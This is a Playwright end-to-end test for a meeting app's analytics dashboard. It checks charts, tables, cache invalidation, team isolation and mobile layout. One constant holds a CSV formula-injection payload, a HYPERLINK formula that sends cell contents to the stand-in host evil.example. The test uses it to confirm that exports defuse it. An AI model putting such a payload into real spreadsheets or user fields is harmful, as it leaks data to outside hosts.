import { readFileSync } from 'node:fs';
import { expect, test, type Page } from '@playwright/test';
import { signInAsDemo, type DemoGuest } from './helpers';

/**
 * The Phase 9 checkpoint: the dashboard's charts render with the seeded demo
 * data, every chart has its table, the numbers follow a change straight away
 * (the cache is invalidated, not waited out), the CSV export is safe to open
 * in a spreadsheet, and a guest sees only their own team.
 *
 * Needs `npm run seed` (or an API that has run its housekeeping sweep once):
 * the eight weeks of seeded history are what there is to chart. The one task
 * this spec creates belongs to its guest, so the global teardown removes it.
 */

const HOSTILE_NAME = '=HYPERLINK("https://evil.example/?d="&A1,"Open")';

async function api(
  page: Page,
  guest: DemoGuest,
  path: string,
  init: { method?: string; data?: unknown } = {},
) {
  const response = await page.request.fetch(`/api${path}`, {
    method: init.method ?? 'GET',
    headers: { Authorization: `Bearer ${guest.accessToken}` },
    data: init.data,
  });
  return response;
}

const tile = (page: Page, label: string) =>
  page.locator('dl > div').filter({ has: page.getByText(label, { exact: true }) });

test('the analytics dashboard charts the seeded history and follows changes', async ({ page }) => {
  test.setTimeout(90_000);
  const guest = await signInAsDemo(page);

  await page
    .getByRole('navigation', { name: 'Main' })
    .getByRole('link', { name: 'Analytics' })
    .click();
  await page.waitForURL('**/app/analytics');
  await expect(page.getByRole('heading', { name: 'Analytics', level: 1 })).toBeVisible();

  // --- Every chart is drawn, with a sentence saying what it shows -----------

  const charts = [
    'Meetings per week',
    'Action items: raised and done',
    'What became of the action items',
    'Task completion by member',
    'Most active members',
  ];
  for (const name of charts) {
    const card = page.getByRole('region', { name, exact: true });
    await expect(card.locator('[data-slot="chart"] svg').first()).toBeVisible();
    await expect(card.locator('p').first()).not.toBeEmpty();
  }
  // Eight weeks of history: real numbers, not an empty dashboard.
  await expect(tile(page, 'Meetings').locator('dd').first()).not.toHaveText('0');
  await expect(page.getByRole('region', { name: 'Meetings per week' })).toContainText(
    /\d+ meetings over 8 weeks/,
  );
  await expect(page.getByRole('region', { name: 'Most active members' })).toContainText(
    /was the most active/,
  );

  // --- The table behind a chart, and the period in the URL ------------------

  const weekly = page.getByRole('region', { name: 'Meetings per week', exact: true });
  await weekly.getByRole('button', { name: 'Show table for Meetings per week' }).click();
  const table = weekly.getByRole('region', { name: 'Meetings per week, table' });
  await expect(table.getByRole('row')).toHaveCount(9); // header + 8 weeks

  await page.getByRole('button', { name: '12 weeks' }).click();
  await expect(page).toHaveURL(/weeks=12/);
  await expect(table.getByRole('row')).toHaveCount(13);
  await weekly.getByRole('button', { name: 'Show chart for Meetings per week' }).click();

  // --- A finished task counts at once ---------------------------------------

  const teams = (await (await api(page, guest, '/teams')).json()) as {
    teams: { id: string; slug: string }[];
  };
  const team = teams.teams.find((entry) => entry.slug === 'intellmeet-demo');
  if (!team) throw new Error('The seeded demo team is missing: run npm run seed');
  const boards = (await (await api(page, guest, `/boards?teamId=${team.id}`)).json()) as {
    boards: { id: string; isDefault: boolean }[];
  };
  const boardId = boards.boards.find((board) => board.isDefault)?.id;
  const board = (await (await api(page, guest, `/boards/${boardId}`)).json()) as {
    board: { columns: { id: string; isDone: boolean }[] };
  };
  const done = board.board.columns.find((column) => column.isDone)?.id;

  const tasksBefore = await tile(page, 'Tasks completed').locator('dd').nth(1).textContent();
  const me = (await (await api(page, guest, '/auth/me')).json()) as { user: { id: string } };
  const created = await api(page, guest, `/boards/${boardId}/tasks`, {
    method: 'POST',
    data: { title: `E2E analytics task ${Date.now()}`, columnId: done, assigneeId: me.user.id },
  });
  expect(created.status()).toBe(201);

  await page.reload();
  const tasksAfter = tile(page, 'Tasks completed').locator('dd').nth(1);
  await expect(tasksAfter).not.toHaveText(tasksBefore ?? '');
  // The guest is now on the completion chart's table, with their one task done.
  const completion = page.getByRole('region', { name: 'Task completion by member', exact: true });
  await expect(completion.getByRole('row', { name: new RegExp(guest.name) })).toContainText('100%');

  // --- The CSV defuses a name a spreadsheet would run ----------------------

  const renamed = await api(page, guest, '/users/me', {
    method: 'PATCH',
    data: { name: HOSTILE_NAME },
  });
  expect(renamed.status()).toBe(200);
  await page.reload();
  await expect(page.getByRole('heading', { name: 'Meetings per week' })).toBeVisible();

  const [download] = await Promise.all([
    page.waitForEvent('download'),
    (async () => {
      await page.getByRole('button', { name: /Export CSV/ }).click();
      await page.getByRole('menuitem', { name: 'Members (.csv)' }).click();
    })(),
  ]);
  expect(download.suggestedFilename()).toMatch(
    /^intellmeet-intellmeet-demo-members-\d{4}-\d{2}-\d{2}-to-\d{4}-\d{2}-\d{2}\.csv$/,
  );
  const csv = readFileSync(await download.path(), 'utf8');
  const lines = csv
    .replace(/^\uFEFF/, '')
    .trimEnd()
    .split('\r\n');
  expect(lines[0]).toMatch(/^"Member","Current member","Meetings attended"/);
  expect(csv).toContain(`"'=HYPERLINK(""https://evil.example/?d=""&A1,""Open"")","yes"`);
  for (const line of lines) expect(line).not.toMatch(/^"?[=+\-@]/);

  // --- Only the guest's own teams -------------------------------------------

  const elsewhere = await api(page, guest, '/analytics/overview?teamId=0123456789abcdef01234567');
  expect(elsewhere.status()).toBe(404);

  // --- A phone's width ----------------------------------------------------------

  await page.setViewportSize({ width: 360, height: 780 });
  await expect(page.getByRole('heading', { name: 'Meetings per week' })).toBeVisible();
  const overflow = await page.evaluate(
    () => document.documentElement.scrollWidth - document.documentElement.clientWidth,
  );
  expect(overflow).toBe(0);
});
